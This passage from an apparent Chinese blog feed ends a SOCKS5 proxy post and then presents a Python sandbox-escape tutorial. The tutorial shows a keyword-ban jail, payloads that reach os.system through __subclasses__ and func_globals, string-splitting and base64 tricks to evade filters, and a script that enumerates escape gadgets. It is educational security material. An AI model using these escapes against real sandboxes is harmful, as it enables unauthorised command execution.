class="string">'__main__'</span><span class="symbol">:</span></div><div class="line">    <span class="comment"># 使用socketserver库的多线程服务器ThreadingTCPServer启动代理</span></div><div class="line">    with ThreadingTCPServer((<span class="string">'127.0.0.1'</span>, <span class="number">9011</span>), SocksProxy) as <span class="symbol">server:</span></div><div class="line">        server.serve_forever()</div></pre></td></tr></table></figure></li><li><p>客户端代码</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">import socket</div><div class="line">import socks</div><div class="line">import requests</div><div class="line"></div><div class="line">socks.set_default_proxy(socks<span class="selector-class">.SOCKS5</span>, <span class="string">"127.0.0.1"</span>, <span class="number">9011</span>, username=None, password=None)</div><div class="line">socket<span class="selector-class">.socket</span> = socks.socksocket</div><div class="line"></div><div class="line"><span class="function"><span class="title">print</span><span class="params">(requests.get(<span class="string">'http://www.baidu.com'</span>)</span></span>.text)</div></pre></td></tr></table></figure></li><li><p>或者可以通过curl等命令直接使用</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ curl -v  --socks5 <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">9011</span>  -U <span class="string">username:</span>password <span class="string">http:</span><span class="comment">//www.baidu.com</span></div></pre></td></tr></table></figure></li></ul><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://zh.wikipedia.org/wiki/SOCKS" target="_blank" rel="external">SOCKS维基百科</a></li><li><a href="https://www.ietf.org/rfc/rfc1928.txt" target="_blank" rel="external">RFC1928</a></li><li><a href="https://www.ietf.org/rfc/rfc1929.txt" target="_blank" rel="external">RFC1928</a></li><li><a href="https://rushter.com/blog/python-socks-server/" target="_blank" rel="external">Writing a simple SOCKS server in Python</a></li><li><a href="https://www.zybuluo.com/programath/note/224435" target="_blank" rel="external">SOCKS协议第五版（SOCKS Protocol Version 5）</a></li><li><a href="https://geesun.github.io/posts/2015/09/socks5_protocol.html" target="_blank" rel="external">SOCKS 5协议简析</a></li><li><a href="http://zhihan.me/network/2017/09/24/socks5-protocol/" target="_blank" rel="external">socks5 协议简介</a></li><li><a href="http://www.mojidong.com/network/2015/03/07/socket5-1/" target="_blank" rel="external">socket5 协议学习与实现(一)</a></li></ul></the></excerpt>]]></content>
      
      <categories>
          
          <category> Python编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> socks </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python沙箱逃逸总结</title>
      <link href="/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/"/>
      <url>/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""><p>Python沙箱逃逸总结</p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="内联函数"><a href="#内联函数" class="headerlink" title="内联函数"></a>内联函数</h3><ul><li>python的内联函数功能强大，可以调用一切函数做自己想做的事情。常用的有下面两个：<figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="strong">__builtins__</span></div><div class="line"><span class="strong">__import__</span></div><div class="line"></div><div class="line"><span class="section"># 下面代码可列出所有的内联函数</span></div><div class="line">dir(<span class="strong">__builtins__</span>)</div><div class="line"></div><div class="line"><span class="section"># Python3有一个builtins模块，可以导入builtins模块后通过dir函数查看所有的内联函数</span></div><div class="line">import builtins</div><div class="line">dir(builtins)</div></pre></td></tr></table></figure></li></ul><h3 id="dir-函数"><a href="#dir-函数" class="headerlink" title="dir()函数"></a>dir()函数</h3><ul><li>如果没有参数，则返回当前本地作用域中的名称列表。如果对象有一个_ <em>dir </em> <em>()的方法，则将调用此方法，并且必须返回属性列表。如果对象没有提供</em> <em>dir </em> <em>()，则该函数会尽最大努力从对象的</em> <em>dict</em> <em>属性（如果已定义）和其类型对象中收集信息。 结果列表不一定完整，并且在对象具有自定义</em> <em>getattr </em> _()时可能不准确。</li><li>默认的dir()机制对不同类型的对象有不同的表现，因为它试图产生最相关的信息，而不是完整的信息：<ul><li>如果对象是模块对象，则列表包含模块属性的名称。</li><li>如果对象是一个类型或类对象，则该列表包含其属性的名称，并递归地显示其基础的属性。</li><li>否则，该列表将包含对象的属性名称，其类属性的名称以及其类的基类的属性的递归。</li></ul></li><li>注意：因为dir()主要是为了方便在交互式提示符下使用而提供的，所以它试图提供一组有趣的名称，而不是试图提供一组严格或一致定义的名称，并且其详细行为可能会在不同版本之间发生变化。 例如，当参数是一个类时，元类属性不在结果列表中。</li></ul><h3 id="object类"><a href="#object类" class="headerlink" title="object类"></a>object类</h3><ul><li><p>python的object类中集成了很多的基础函数，我们想要调用的时候也是需要用object去操作的，主要是通过_ <em>mro</em> <em>和</em> <em>bases</em> _两种方式来创建object的方法如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>]</div><div class="line">&lt;type <span class="string">'object'</span>&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>]</div><div class="line">&lt;type <span class="string">'object'</span>&gt;</div><div class="line">&gt;&gt;&gt;[].__class__.__mro__[<span class="number">1</span>]</div><div class="line">&lt;type <span class="string">'object'</span>&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</div><div class="line">&lt;type <span class="string">'object'</span>&gt;</div></pre></td></tr></table></figure></li><li><p>然后通过object类的_ <em>subclasses</em> _()方法获取所有的子类列表，Python2和Python3获取的子类不同。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;&#123;&#125;.__class__.__bases__[<span class="number">0</span>].__subclasses__()</div><div class="line">&gt;&gt;&gt;<span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()</div></pre></td></tr></table></figure></li></ul><h3 id="import导入机制"><a href="#import导入机制" class="headerlink" title="import导入机制"></a>import导入机制</h3><ul><li>当 import 一个模块时首先会在 sys.modules 这个字典中查找是否已经加载了此模块，如果加载了则只是将模块的名字加入到正在调用 import 的模块的 Local 命名空间中。如果没有加载则从 sys.path 目录中按照模块名称查找模块文件，模块可以是 py、pyc、pyd，找到后将模块载入内存，并加到 sys.modules 中，并将名称导入到当前的 Local 命名空间。</li><li>通过 from a import b 导入，a 会被添加到 sys.modules 字典中，b 会被导入到当前的 Local 命名空间。通过 import a as b 导入，a 会被添加到 sys.modules 字典中，b 会被导入到当前的 Local 命名空间。对于嵌套导入的，比如 a.py 中存在一个 import b，那么 import a 时，a 和 b 模块都会被添加到 sys.modules 字典中，a 会被导入到当前的 Local 命名空间中，虽然模块 b 已经加载到内存了，如果访问还要再明确的在本模块中 import b。</li><li>导入模块时会执行该模块。</li><li>所以说如果某一个模块导入了os模块，我们就可以利用该模块的<em> </em> dict <em> </em>进而使用os模块，如下:<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> linecache</div><div class="line"></div><div class="line">linecache.__dict__[<span class="string">'os'</span>].system(<span class="string">'ls'</span>)</div><div class="line"><span class="comment"># 等价于</span></div><div class="line">linecache.os.system(<span class="string">'ls'</span>)</div></pre></td></tr></table></figure></li></ul><h2 id="Python中可以利用的方法和模块"><a href="#Python中可以利用的方法和模块" class="headerlink" title="Python中可以利用的方法和模块"></a>Python中可以利用的方法和模块</h2><h3 id="1-任意代码或者命令执行"><a href="#1-任意代码或者命令执行" class="headerlink" title="1.任意代码或者命令执行"></a>1.任意代码或者命令执行</h3><h4 id="import-函数"><a href="#import-函数" class="headerlink" title="_ import _()函数"></a>_ <em>import</em> _()函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">__import__(<span class="string">"os"</span>).system(<span class="string">"ls"</span>)</div></pre></td></tr></table></figure><h4 id="timeit模块"><a href="#timeit模块" class="headerlink" title="timeit模块"></a>timeit模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> timeit</div><div class="line">timeit.timeit(<span class="string">"__import__('os').system('ls')"</span>,number=<span class="number">1</span>)</div></pre></td></tr></table></figure><h4 id="exec-，eval-，execfile-，compile-函数"><a href="#exec-，eval-，execfile-，compile-函数" class="headerlink" title="exec()，eval()，execfile()，compile()函数"></a>exec()，eval()，execfile()，compile()函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">eval(<span class="string">'__import__("os").system("ls")'</span>)</div><div class="line">exec(<span class="string">"a+1"</span>)</div><div class="line">compile(<span class="string">'a = 1 + 2'</span>, <span class="string">'&lt;string&gt;'</span>, <span class="string">'exec'</span>)</div></pre></td></tr></table></figure><ul><li>注意：execfile()只存在于Python2，Python3没有该函数</li></ul><h4 id="platform模块"><a href="#platform模块" class="headerlink" title="platform模块"></a>platform模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> platform</div><div class="line">platform.popen(<span class="string">'dir'</span>).read()</div></pre></td></tr></table></figure><h4 id="os模块"><a href="#os模块" class="headerlink" title="os模块"></a>os模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line">os.system(<span class="string">'ls'</span>)</div><div class="line">os.popen(<span class="string">"ls"</span>).read()</div></pre></td></tr></table></figure><h4 id="subprocess模块"><a href="#subprocess模块" class="headerlink" title="subprocess模块"></a>subprocess模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> subprocess</div><div class="line">subprocess.Popen(<span class="string">'ls'</span>, shell=<span class="keyword">True</span>, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()</div></pre></td></tr></table></figure><h4 id="importlib模块"><a href="#importlib模块" class="headerlink" title="importlib模块"></a>importlib模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> importlib</div><div class="line">importlib.import_module(<span class="string">'os'</span>).system(<span class="string">'ls'</span>)</div><div class="line"><span class="comment"># Python3可以，Python2没有该函数</span></div><div class="line">importlib.__import__(<span class="string">'os'</span>).system(<span class="string">'ls'</span>)</div></pre></td></tr></table></figure><h3 id="2-文件操作"><a href="#2-文件操作" class="headerlink" title="2.文件操作"></a>2.文件操作</h3><h4 id="file-函数"><a href="#file-函数" class="headerlink" title="file()函数"></a>file()函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file(<span class="string">'test.txt'</span>).read()</div></pre></td></tr></table></figure><ul><li>注意：该函数只存在于Python2，Python3不存在</li></ul><h4 id="open-函数"><a href="#open-函数" class="headerlink" title="open()函数"></a>open()函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">open(<span class="string">'text.txt'</span>).read()</div></pre></td></tr></table></figure><h4 id="codecs模块"><a href="#codecs模块" class="headerlink" title="codecs模块"></a>codecs模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> codecs</div><div class="line">codecs.open(<span class="string">'test.txt'</span>).read()</div></pre></td></tr></table></figure><h3 id="3-获取当前Python环境"><a href="#3-获取当前Python环境" class="headerlink" title="3.获取当前Python环境"></a>3.获取当前Python环境</h3><h4 id="sys模块"><a href="#sys模块" class="headerlink" title="sys模块"></a>sys模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> sys</div><div class="line">sys.version</div></pre></td></tr></table></figure><h3 id="一些绕过方式"><a href="#一些绕过方式" class="headerlink" title="一些绕过方式"></a>一些绕过方式</h3><h4 id="reload-方法"><a href="#reload-方法" class="headerlink" title="reload()方法"></a>reload()方法</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'__import__'</span>] <span class="comment"># __import__ is the function called by the import statement</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'eval'</span>] <span class="comment"># evaluating code could be dangerous</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'execfile'</span>] <span class="comment"># likewise for executing the contents of a file</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'input'</span>] <span class="comment"># Getting user input and evaluating it might be dangerous</span></div></pre></td></tr></table></figure><ul><li>看起来很安全，但是我们可以通过reload()函数重新加载<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;</span>&gt; reload(__builtins_<span class="number">_</span>)</div><div class="line"><span class="meta">&gt;&gt;</span>&gt; import os</div><div class="line"><span class="meta">&gt;&gt;</span>&gt; dir(os)</div></pre></td></tr></table></figure></li></ul><h4 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;</span>&gt; import base64</div><div class="line"><span class="meta">&gt;&gt;</span>&gt; base64.b64encode(<span class="string">'__import__'</span>)</div><div class="line"><span class="string">'X19pbXBvcnRfXw=='</span></div><div class="line"><span class="meta">&gt;&gt;</span>&gt; base64.b64encode(<span class="string">'os'</span>)</div><div class="line"><span class="string">'b3M='</span></div><div class="line"><span class="meta">&gt;&gt;</span>&gt; __builtins_<span class="number">_</span>.__dict_<span class="number">_</span>[<span class="string">'X19pbXBvcnRfXw=='</span>.decode(<span class="string">'base64'</span>)](<span class="string">'b3M='</span>.decode(<span class="string">'base64'</span>))</div><div class="line">&lt;<span class="class"><span class="keyword">module</span> '<span class="title">os</span>' <span class="title">from</span> '/<span class="title">usr</span>/<span class="title">lib</span>/<span class="title">python2</span>.7/<span class="title">os</span>.<span class="title">pyc</span>'&gt;</span></div></pre></td></tr></table></figure><h2 id="利用上面的方法和模块逃逸沙箱"><a href="#利用上面的方法和模块逃逸沙箱" class="headerlink" title="利用上面的方法和模块逃逸沙箱"></a>利用上面的方法和模块逃逸沙箱</h2><ul><li><p>下面代码该如何绕过：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Python2</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</div><div class="line"></div><div class="line">banned = [</div><div class="line">    <span class="string">"import"</span>,</div><div class="line">    <span class="string">"exec"</span>,</div><div class="line">    <span class="string">"eval"</span>,</div><div class="line">    <span class="string">"pickle"</span>,</div><div class="line">    <span class="string">"os"</span>,</div><div class="line">    <span class="string">"subprocess"</span>,</div><div class="line">    <span class="string">"kevin sucks"</span>,</div><div class="line">    <span class="string">"input"</span>,</div><div class="line">    <span class="string">"banned"</span>,</div><div class="line">    <span class="string">"cry sum more"</span>,</div><div class="line">    <span class="string">"sys"</span></div><div class="line">]</div><div class="line"></div><div class="line">targets = __builtins__.__dict__.keys()</div><div class="line">targets.remove(<span class="string">'raw_input'</span>)</div><div class="line">targets.remove(<span class="string">'print'</span>)</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> targets:</div><div class="line">    <span class="keyword">del</span> __builtins__.__dict__[x]</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">    print(<span class="string">"&gt;&gt;&gt;"</span>, end=<span class="string">' '</span>)</div><div class="line">    data = raw_input()</div><div class="line"></div><div class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> banned:</div><div class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> data.lower():</div><div class="line">            print(<span class="string">"No bueno"</span>)</div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">else</span>: <span class="comment"># this means nobreak</span></div><div class="line">        <span class="keyword">exec</span> data</div></pre></td></tr></table></figure></li><li><p>Python2有如下几种绕过方式：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="section"># 利用file()函数读取文件：</span></div><div class="line">print(().<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">40</span>](<span class="link">'./test.py'</span>).read())</div><div class="line"></div><div class="line"><span class="section"># 执行系统命令：</span></div><div class="line">print(().<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">59</span>].<span class="strong">__init__</span>.func<span class="emphasis">_globals['linecache']._</span><span class="emphasis">_dict_</span><span class="emphasis">_['o'+'s']._</span><span class="emphasis">_dict_</span>_[<span class="string">'sy'+'stem'</span>](<span class="link">'ls'</span>))</div><div class="line"><span class="section"># 等效于下面语句，但是无法绕过</span></div><div class="line">print(().<span class="strong">__class__</span>.<span class="strong">__bases__</span>[0].<span class="strong">__subclasses__</span>()[59].<span class="strong">__init__</span>.func_globals['linecache'].os.system('ls'))</div><div class="line"></div><div class="line"><span class="section"># 执行系统命令：</span></div><div class="line">print(().<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">59</span>].<span class="strong">__init__</span>.func<span class="emphasis">_globals.values()[13]['eval']('_</span><span class="emphasis">_import_</span>_("os").system("ls")'))</div><div class="line"></div><div class="line"><span class="section"># 重新载入__builtins__：</span></div><div class="line">print(().<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">59</span>](<span class="link"></span>).<span class="emphasis">_module._</span><span class="emphasis">_builtins_</span><span class="emphasis">_['_</span><span class="emphasis">_import_</span>_']("os").system("ls"))</div></pre></td></tr></table></figure></li></ul><h2 id="遍历找到其他的逃逸方法"><a href="#遍历找到其他的逃逸方法" class="headerlink" title="遍历找到其他的逃逸方法"></a>遍历找到其他的逃逸方法</h2><ul><li>通过上面的一些绕过姿势我们发现，无外乎是利用 <em> </em> subclasses <em> </em> 中的一些特殊的方法或者模块然后来调用一些函数或者模块来读取文件，或者执行命令，那么我们可以遍历所有的系统库，然后找到所有的使用了os等模块的模块，然后遍历 <em> </em> subclasses <em> </em> 列表，找到所有可以绕过的姿势。</li></ul><h3 id="1-找到所有的特殊系统模块"><a href="#1-找到所有的特殊系统模块" class="headerlink" title="1.找到所有的特殊系统模块"></a>1.找到所有的特殊系统模块</h3><ul><li>首先去Python的GitHub主页，找到所有的模块列表：<ul><li>Python2.7：<a href="https://github.com/python/cpython/tree/2.7/Lib" target="_blank" rel="external">https://github.com/python/cpython/tree/2.7/Lib</a></li><li>Python3.6：<a href="https://github.com/python/cpython/tree/3.6/Lib" target="_blank" rel="external">https://github.com/python/cpython/tree/3.6/Lib</a></li></ul></li></ul><h3 id="2-遍历所有的特殊模块"><a href="#2-遍历所有的特殊模块" class="headerlink" title="2.遍历所有的特殊模块"></a>2.遍历所有的特殊模块</h3><ul><li><p>遍历代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding=UTF-8</span></div><div class="line"><span class="comment"># Python2</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> codecs</div><div class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</div><div class="line"></div><div class="line"><span class="keyword">with</span> codecs.open(<span class="string">'2.7.txt'</span>, <span class="string">'r'</span>, encoding=<span class="string">'UTF-8'</span>) <span class="keyword">as</span> f:</div><div class="line">    modules = f.readlines()</div><div class="line"></div><div class="line">modules = [m.split()[<span class="number">0</span>].replace(<span class="string">'.py'</span>, <span class="string">''</span>) <span class="keyword">for</span> m <span class="keyword">in</span> modules]</div><div class="line"></div><div class="line">target_modules = [<span class="string">'os'</span>, <span class="string">'platform'</span>, <span class="string">'subprocess'</span>, <span class="string">'timeit'</span>, <span class="string">'importlib'</span>, <span class="string">'codecs'</span>, <span class="string">'sys'</span>]</div><div class="line">target_functions = [<span class="string">'__import__'</span>, <span class="string">'__builtins__'</span>, <span class="string">'exec'</span>, <span class="string">'eval'</span>, <span class="string">'execfile'</span>, <span class="string">'compile'</span>, <span class="string">'file'</span>, <span class="string">'open'</span>]</div><div class="line"></div><div class="line">all_targets = target_modules + target_functions</div><div class="line"></div><div class="line">results = defaultdict(list)</div><div class="line"></div><div class="line"><span class="keyword">for</span> m <span class="keyword">in</span> modules:</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        module = __import__(m)</div><div class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">        <span class="comment"># print('ERROR:', m)</span></div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> all_targets:</div><div class="line">        <span class="keyword">if</span> t <span class="keyword">in</span> module.__dict__:</div><div class="line">            results[m.encode()].append(t)</div><div class="line"></div><div class="line">print(<span class="string">"可利用模块数量为:"</span>+str(len(results)))</div><div class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> results.items():</div><div class="line">    print(k, v)</div></pre></td></tr></table></figure></li><li><p>遍历结果如下：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="number">253</span></div><div class="line">(<span class="string">'filecmp'</span>, [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>])</div><div class="line">(<span class="string">'heapq'</span>, [<span class="string">'__builtins__'</span>])</div><div class="line">(<span class="string">'code'</span>, [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>])</div><div class="line">(<span class="string">'hotshot'</span>, [<span class="string">'__builtins__'</span>])</div><div class="line">(<span class="string">'distutils'</span>, [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>])</div><div class="line">(<span class="string">'functools'</span>, [<span class="string">'__builtins__'</span>])</div><div class="line">(<span class="string">'random'</span>, [<span class="string">'__builtins__'</span>])</div><div class="line">(<span class="string">'tty'</span>, [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>])</div><div class="line">(<span class="string">'aifc'</span>, [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>])</div><div class="line">(<span class="string">'sysconfig'</span>, [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>])</div><div class="line">(<span class="string">'pprint'</span>, [<span class="string">'__builtins__'</span>])</div><div class="line">(<span class="string">'whichdb'</span>, [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>])</div><div class="line">...</div><div class="line">------------</div><div class="line">去重后的模块数量为:<span class="number">253</span></div><div class="line">[<span class="string">'filecmp'</span>, <span class="string">'heapq'</span>, <span class="string">'code'</span>, <span class="string">'hotshot'</span>, <span class="string">'distutils'</span>, ...]</div></pre></td></tr></table></figure></li></ul><h3 id="3-遍历-subclasses-寻找上述可以利用的模块和函数"><a href="#3-遍历-subclasses-寻找上述可以利用的模块和函数" class="headerlink" title="3.遍历   subclasses  寻找上述可以利用的模块和函数"></a>3.遍历 <em> </em> subclasses <em> </em>寻找上述可以利用的模块和函数</h3><ul><li><p>我们找到了253个可以利用的模块，接下来遍历利用的方式，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div 